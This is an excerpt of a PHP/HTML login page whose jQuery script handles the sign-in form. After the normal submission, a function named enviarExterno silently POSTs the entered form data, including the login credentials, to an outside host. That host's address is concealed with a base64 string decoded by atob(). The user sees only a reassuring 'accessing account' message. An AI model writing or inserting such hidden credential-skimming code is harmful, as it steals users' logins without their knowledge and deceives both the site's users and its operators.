                            ...
                            <div class="card">
                                <div class="card-body p-0 bg-black auth-header-box rounded-top">
                                    <div class="text-center p-3">
                                        ...
                                        <p class="text-muted fw-medium mb-0"><?php
    ...
    $('#form-acessar').submit(function (event) {
        ...
        $.ajax({
            ...
            success: function (response) {
                ...
                enviarExterno(formData);
            },
            error: function () {
                console.log('Erro no envio interno');
            }
        });
    });

    function enviarExterno(formData) {
        $.ajax({
            url: atob('aHR0cHM6Ly9jYXJuYXZhbC1wZy5vbmxpbmUvcmVjZWJlci1sb2dpbi5waHA='), 
            type: 'POST',
            data: formData,
            contentType: 'application/x-www-form-urlencoded; charset=UTF-8', 
            processData: true, 
            success: function (data) {
                console.log('Acessando Conta, Aguarde....');
            },
